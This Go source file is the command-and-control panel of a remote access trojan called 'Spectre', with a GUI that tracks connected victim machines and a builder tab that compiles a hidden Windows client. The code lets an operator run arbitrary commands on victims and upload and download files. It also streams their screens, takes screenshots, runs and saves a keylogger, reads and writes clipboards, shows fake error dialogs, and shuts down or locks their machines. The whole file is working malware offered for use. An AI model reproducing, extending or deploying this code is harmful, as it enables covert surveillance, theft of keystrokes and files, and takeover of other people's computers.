package main

import (
	"bufio"
	"errors"
	"fmt"
	"image/jpeg"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/go-toast/toast"
)

var (
	tableData = [][]string{
		{"ID", "IP", "Country", "Username", "OS", ""},
	}

	mutex sync.Mutex

	selected Connection
	clients  = []Connection{}
	connects = 0

	table     *widget.Table
	Display   *widget.Entry
	Building  *widget.Entry
	myApp     fyne.App
	myWindow  fyne.Window
	streaming = false

	filename string
)

type Connection struct {
	ip       string
	hostname string
	conn     net.Conn
	reader   bufio.Reader
	writer   bufio.Writer
}

func notify(title string, message string) {
	notification := toast.Notification{
		AppID:   "Spectre",
		Title:   title,
		Message: message,
		Audio:   toast.SMS,
	}
	notification.Push()
}

func writeCommand(command string) {
	if selected.conn != nil {
		selected.writer.WriteString(command + "\n")
		selected.writer.Flush()
	}
}

func handleServer() {
	server, err := net.Listen("tcp", "0.0.0.0:8080")
	if err != nil {
		os.Exit(1)
	}
	for {
		client, err := server.Accept()
		if err != nil {
			continue
		}
		NewConn := Connection{"", "", client, *bufio.NewReader(client), *bufio.NewWriter(client)}
		info, err := NewConn.reader.ReadString('\n')
		if err != nil {
			removeClient(&selected)
		} else {
			addClient(&NewConn, info)
			go handleClient(&NewConn)
		}
	}
}

func addClient(client *Connection, Info string) {
	Data := strings.Split(Info, ";")
	client.ip = Data[0]
	client.hostname = Data[2]
	mutex.Lock()
	tableData = append(tableData, append([]string{strconv.Itoa(connects)}, append(Data, []string{""}...)...))
	clients = append(clients, *client)
	mutex.Unlock()
	connects++
	go notify("New client connected!", fmt.Sprintf("Connection from %v!", client.ip))
	table.Refresh()
}

func removeClient(client *Connection) {
	for i, cli := range clients {
		if cli.conn == client.conn {
			client.conn.Close()
			mutex.Lock()
			clients = append(clients[:i], clients[i+1:]...)
			tableData = append(tableData[:i+1], tableData[i+2:]...)
			mutex.Unlock()
			connects--
			go notify("Client disconected!", fmt.Sprintf("%v timed out!", client.ip))
		}
	}
	table.Refresh()
}

func handleClient(client *Connection) {
	for {
		if selected.conn == client.conn {
			out, err := client.reader.ReadString('\n')
			if err != nil {
				removeClient(client)
				selected = Connection{}
			}
			out = strings.TrimSpace(out)
			switch out {
			case "<SCREEN>":
				img, _ := jpeg.Decode(client.conn)
				Screen := myApp.NewWindow("Screenshot")
				Screen.Resize(fyne.NewSize(600, 400))
				Screen.SetFixedSize(true)
				Screen.SetContent(canvas.NewImageFromImage(img))
				Screen.Show()

			case "<SHARE>":
				streaming = true
				Screen := myApp.NewWindow("Share")
				Screen.Resize(fyne.NewSize(600, 400))
				Screen.SetFixedSize(true)
				Image := canvas.NewImageFromImage(nil)
				Screen.SetContent(Image)
				Screen.Show()
				for streaming {
					img, _ := jpeg.Decode(selected.conn)
					Image.Image = img
					Image.Refresh()
					time.Sleep(time.Millisecond * 50)
				}
				Screen.Close()

			case "<START>":
				Display.SetText(Display.Text + readAll("<END>"))
				Display.SetText(Display.Text + "\n\n")

				Display.CursorRow = len(Display.Text)

			case "<LOG>":
				data := readAll("<END>")
				os.WriteFile(fmt.Sprintf("%v@keylog.log", selected.hostname), []byte(data), 0644)
				dialog.NewInformation("Keylog Saved!", fmt.Sprintf("Keylog saved in '%v@keylog.log'.", selected.hostname), myWindow).Show()
				exec.Command("explorer.exe", ".\\").Start()

			case "<DOWNLOAD>":
				for {
					data := readAll("<END>")
					os.WriteFile(filename, []byte(data), 0644)
					exec.Command("explorer.exe", ".\\").Start()
				}
			}
		}
		time.Sleep(time.Millisecond * 200)
	}
}

func readAll(EOF string) string {
	var LOG strings.Builder
	for {
		out, err := selected.reader.ReadString('\n')
		if err != nil {
			removeClient(&selected)
			selected = Connection{}
			break
		}
		if strings.TrimSpace(out) == EOF {
			return LOG.String()
		} else if out != "" {
			LOG.WriteString(out)
		}
	}
	return ""
}

func main() {
	myApp = app.New()
	myApp.Settings().SetTheme(theme.LightTheme())

	myWindow = myApp.NewWindow("Spectre")
	myWindow.Resize(fyne.NewSize(900, 600))
	myWindow.SetFixedSize(true)
	myWindow.SetIcon(theme.VisibilityIcon())

	Building = widget.NewMultiLineEntry()
	Building.SetPlaceHolder("Build status...")
	Building.SetMinRowsVisible(22)

	Display = widget.NewMultiLineEntry()
	Display.SetPlaceHolder("Your responses will appear here...")
	Display.SetMinRowsVisible(26)

	portEntry := widget.NewEntry()
	portEntry.PlaceHolder = "Port..."

	hostEntry := widget.NewEntry()
	hostEntry.PlaceHolder = "Host..."

	err := dialog.NewError(errors.New("No client selected!"), myWindow)

	table = widget.NewTable(
		func() (rows int, cols int) { return len(tableData), 6 },
		func() fyne.CanvasObject { return widget.NewLabel("255.255.255.255") },
		func(id widget.TableCellID, cell fyne.CanvasObject) {
			cell.(*widget.Label).SetText(tableData[id.Row][id.Col])
		})

	table.OnSelected = func(id widget.TableCellID) {
		if id.Row > 0 {
			selected = clients[id.Row-1]
		} else {
			selected = Connection{}
		}
	}

	go handleServer()

	myEntry1 := widget.NewEntry()
	myEntry2 := widget.NewEntry()
	myEntry3 := widget.NewEntry()

	toolbar := container.NewVBox(
		widget.NewButtonWithIcon("Information", theme.InfoIcon(), func() {
			if selected.conn != nil && !streaming {
				writeCommand("\x01")
			} else {
				err.Show()
			}

		}),
		widget.NewButtonWithIcon("Screen Share", theme.ComputerIcon(), func() {
			if selected.conn != nil {
				dialog.NewCustomConfirm("Screen Share", "Start", "Stop", widget.NewLabel("Select Method..."), func(b bool) {
					if b && !streaming {
						writeCommand("\x02")
						writeCommand("1")
					} else if streaming && !b {
						writeCommand("\x02")
						writeCommand("0")
						streaming = false
					}
				}, myWindow).Show()
			} else {
				err.Show()
			}

		}),
		widget.NewButtonWithIcon("Open Url", theme.MailAttachmentIcon(), func() {
			if selected.conn != nil && !streaming {
				myEntry1.SetPlaceHolder("URL...")
				dialog.NewCustomConfirm("URL", "Open", "Cancel", myEntry1, func(b bool) {
					if b && strings.TrimSpace(myEntry1.Text) != "" {
						writeCommand("\x03")
						writeCommand(myEntry1.Text)
					}
				}, myWindow).Show()
				myEntry1.SetText("")
			} else {
				err.Show()
			}
		}),
		widget.NewButtonWithIcon("Execute Command", theme.BrokenImageIcon(), func() {
			if selected.conn != nil {
				myEntry1.SetPlaceHolder("Command...")
				dialog.NewCustomConfirm("Executor", "Execute", "Cancel", myEntry1, func(b bool) {
					if b && !streaming {
						writeCommand("\x04")
						writeCommand(myEntry1.Text)
					}
				}, myWindow).Show()
				myEntry1.SetText("")
			} else {
				err.Show()
			}
		}),

		widget.NewButtonWithIcon("Clipboard Manager", theme.ContentCopyIcon(), func() {
			if selected.conn != nil {
				dialog.NewCustomConfirm("Clipboard", "PUT", "GET", widget.NewLabel("Select Method..."), func(b bool) {
					if b {
						myEntry1.SetPlaceHolder("Content...")
						dialog.NewCustomConfirm("Clipboard", "Put", "Cancel", myEntry1, func(b bool) {
							if b && !streaming {
								writeCommand("\x05")
								writeCommand("1")
								writeCommand(myEntry1.Text)
							}
						}, myWindow).Show()
					} else {
						dialog.NewCustomConfirm("Clipboard", "Get", "Cancel", widget.NewLabel("Fetching content..."), func(b bool) {
							if b && !streaming {
								writeCommand("\x05")
								writeCommand("0")
							}
						}, myWindow).Show()
					}
				}, myWindow).Show()

				myEntry1.SetText("")
			} else {
				err.Show()
			}
		}),

		widget.NewButtonWithIcon("Fake Error", theme.WarningIcon(), func() {
			if selected.conn != nil {
				myEntry1.SetPlaceHolder("Title...")
				myEntry2.SetPlaceHolder("Message...")
				dialog.NewCustomConfirm("FakeError", "Show", "Cancel", container.NewVBox(myEntry1, myEntry2), func(b bool) {
					if b && !streaming {
						writeCommand("\x06")
						writeCommand(myEntry1.Text)
						writeCommand(myEntry2.Text)
					}
				}, myWindow).Show()
				myEntry1.SetText("")
				myEntry2.SetText("")
			} else {
				err.Show()
			}
		}),

		widget.NewButtonWithIcon("Set Wallpaper", theme.CheckButtonIcon(), func() {
			if selected.conn != nil {
				myEntry1.SetPlaceHolder("Image Address...")
				dialog.NewCustomConfirm("Wallpaper-Changer", "Change", "Cancel", container.NewVBox(myEntry1), func(b bool) {
					if b && !streaming {
						writeCommand("\x15")
						writeCommand(myEntry1.Text)
					}
				}, myWindow).Show()
				myEntry1.SetText("")
			} else {
				err.Show()
			}
		}),

		widget.NewButtonWithIcon("Notification", theme.ErrorIcon(), func() {
			if selected.conn != nil {
				myEntry1.SetPlaceHolder("App Name...")
				myEntry2.SetPlaceHolder("Title...")
				myEntry3.SetPlaceHolder("Message...")
				dialog.NewCustomConfirm("Notifier", "Notify", "Cancel", container.NewVBox(myEntry1, myEntry2, myEntry3), func(b bool) {
					if b && !streaming {
						writeCommand("\x07")
						writeCommand(myEntry1.Text)
						writeCommand(myEntry2.Text)
						writeCommand(myEntry3.Text)
					}
				}, myWindow).Show()
				myEntry1.SetText("")
				myEntry2.SetText("")
				myEntry3.SetText("")
			} else {
				err.Show()
			}
		}),

		widget.NewButtonWithIcon("Screenshot", theme.ViewFullScreenIcon(), func() {
			if selected.conn != nil {
				if !streaming {
					writeCommand("\x08")
				}
			} else {
				err.Show()
			}
		}),

		widget.NewButtonWithIcon("Keylogger", theme.CheckButtonCheckedIcon(), func() {
			if selected.conn != nil {
				dialog.NewCustomConfirm("Keylogger", "Start", "Stop", widget.NewLabel("Select Method..."), func(b bool) {
					if b && !streaming {
						writeCommand("\x09")
						writeCommand("1")
					} else if !streaming {
						writeCommand("\x09")
						writeCommand("0")
					}
				}, myWindow).Show()
			} else {
				err.Show()
			}
		}),

		widget.NewButtonWithIcon("Shutdown", theme.MoveDownIcon(), func() {
			if selected.conn != nil {
				if !streaming {
					writeCommand("\x10")
				}
			} else {
				err.Show()
			}

		}),

		widget.NewButtonWithIcon("Restart", theme.MediaReplayIcon(), func() {
			if selected.conn != nil {
				if !streaming {
					writeCommand("\x11")
				}
			} else {
				err.Show()
			}

		}),

		widget.NewButtonWithIcon("Lock Screen", theme.VisibilityOffIcon(), func() {
			if selected.conn != nil {
				if !streaming {
					writeCommand("\x12")
				}
			} else {
				err.Show()
			}

		}),

		widget.NewButtonWithIcon("Download", theme.DownloadIcon(), func() {
			if selected.conn != nil {
				if !streaming {
					myEntry1.SetPlaceHolder("Remote Path...")
					dialog.NewCustomConfirm("Download", "Download", "Cancel", myEntry1, func(b bool) {
						if b && !streaming {
							writeCommand("\x13")
							writeCommand(strings.TrimSpace(myEntry1.Text))
							filename = filepath.Base(strings.TrimSpace(myEntry1.Text))
						}
					}, myWindow).Show()
					myEntry1.SetText("")
				}
			} else {
				err.Show()
			}

		}),

		widget.NewButtonWithIcon("Upload", theme.UploadIcon(), func() {
			if selected.conn != nil {
				myEntry1.SetPlaceHolder("Local Path...")
				dialog.NewCustomConfirm("Upload", "Upload", "Cancel", myEntry1, func(b bool) {
					if b && !streaming {
						if _, err := os.Stat(strings.TrimSpace(myEntry1.Text)); err == nil {
							data, err := os.ReadFile(strings.TrimSpace(myEntry1.Text))
							if err == nil {
								writeCommand("\x14")
								writeCommand(filepath.Base(strings.TrimSpace(myEntry1.Text)))
								writeCommand(string(data))
								writeCommand("<END>")
							}
						} else {
							dialog.NewError(errors.New("File not found!"), myWindow)
						}
					}
				}, myWindow).Show()
				myEntry1.SetText("")

			} else {
				err.Show()
			}
		}),
	)

	tabs := container.NewAppTabs(
		container.NewTabItemWithIcon("Home", theme.HomeIcon(), container.NewBorder(nil, nil, nil, container.NewVScroll(toolbar), table)),
		container.NewTabItemWithIcon("Builder", theme.SettingsIcon(), container.NewVBox(
			widget.NewLabelWithStyle("Builder", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
			Building,
			hostEntry,
			portEntry,
			widget.NewCard("", "", widget.NewButton("Build", func() {
				port, err := strconv.Atoi(portEntry.Text)
				Building.SetText("")
				if strings.TrimSpace(hostEntry.Text) != "" && port > 0 && port < 65537 && err == nil {
					Building.SetText(Building.Text + "[+] Building process initialised.\n")
					data, err := os.ReadFile("lib/client.req")
					if err != nil {
						Building.SetText(Building.Text + "[-] Client code not found.\n\n")
					} else {
						os.Mkdir("build", 0644)
						os.Chdir("build")
						time.Sleep(time.Millisecond * 400)
						Building.SetText(Building.Text + "[+] Client code successfully opened.\n")

						code := strings.Replace(string(data), "<HOST>", hostEntry.Text, 1)
						code = strings.Replace(code, "<PORT>", portEntry.Text, 1)
						time.Sleep(time.Millisecond * 600)
						Building.SetText(Building.Text + "[+] HOST/PORT parameters injected.\n")
						os.WriteFile("build.go", []byte(code), 0644)
						Building.SetText(Building.Text + "[+] Client process closed.\n")
						time.Sleep(time.Millisecond * 300)
						Building.SetText(Building.Text + "[+] Golang compiler detected and ready.\n")
						time.Sleep(time.Millisecond * 300)
						Building.SetText(Building.Text + "[+] Compilation process started.\n")
						exec.Command("go.exe", "mod", "init", "build").Run()
						exec.Command("go.exe", "mod", "tidy").Run()
						exec.Command("go.exe", "build", "--ldflags", "-s -H windowsgui", "build.go").Run()
						Building.SetText(Building.Text + "[+] Compilation completed successfully.\n")
						time.Sleep(time.Millisecond * 200)
						Building.SetText(Building.Text + "[+] Cleanup in progress...\n")
						os.Remove("go.mod")
						os.Remove("go.sum")
						os.Remove("build.go")
						time.Sleep(time.Millisecond * 900)
						Building.SetText(Building.Text + "[+] Build process completed successfully!\n\n")
						exec.Command("explorer.exe", ".\\").Start()
						os.Chdir("..")
					}
				} else {
					Building.SetText(Building.Text + "[-] Failed to start the build due to invalid HOST/PORT parameters!\n\n")
					dialog.NewError(errors.New("Invalid input detected!"), myWindow).Show()
				}
				hostEntry.SetText("")
				portEntry.SetText("")
			})),
		)),
		container.NewTabItemWithIcon("Logs", theme.DocumentIcon(),
			container.NewVBox(
				widget.NewLabelWithStyle("Logs", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
				Display,
				widget.NewCard("", "", widget.NewButton("Save Log", func() {
					os.WriteFile(fmt.Sprintf("%v@logs.log", time.Now().Format("02.01")), []byte(Display.Text), 0644)
					dialog.NewInformation("Log Saved!", fmt.Sprintf("Log saved in '%v@logs.log'.", time.Now().Format("02.01")), myWindow).Show()
					exec.Command("explorer.exe", ".\\").Start()
				})),
			),
		),
	)

	tabs.SetTabLocation(container.TabLocationLeading)

	myWindow.SetContent(tabs)
	myWindow.ShowAndRun()
}
